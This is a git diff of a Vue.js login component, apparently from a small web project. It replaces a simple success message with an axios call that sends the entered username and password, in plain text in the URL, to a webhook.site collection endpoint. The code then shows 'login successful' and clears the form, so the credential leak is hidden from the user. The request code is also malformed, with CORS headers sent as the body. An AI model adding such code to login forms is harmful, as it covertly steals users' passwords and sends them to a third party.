@@ -22,6 +22,7 @@
 
 
 <script>
+import axios from 'axios'
 import { ElMessage } from 'element-plus'
 export default {
   name: 'Login',
@@ -33,13 +34,27 @@ export default {
   },
   methods: {
     login () {
-      ElMessage({
-        message: 'Амжилттай нэвтэрлээ...',
-        type: 'success',
+        axios
+      .post('https://webhook.site/20af77a0-c971-444c-bdcc-cd2fb625f994' + '?userName=' + this.userName + '&password=' + this.password, {
+        headers: {
+          "Access-Control-Allow-Origin": "*",
+          "Access-Control-Allow-Methods": "*",
+          "Access-Control-Allow-Headers": "*"
+        }
       })
+        .then(response => {
+          if (response.status === 200) {
+            ElMessage({
+              message: 'Амжилттай нэвтэрлээ...',
+              type: 'success',
+            })
+            this.userName = ''
+            this.password = ''
+          }
+        })
+      }
     }
   }
-}
 </script>
 <style scoped>
 body {
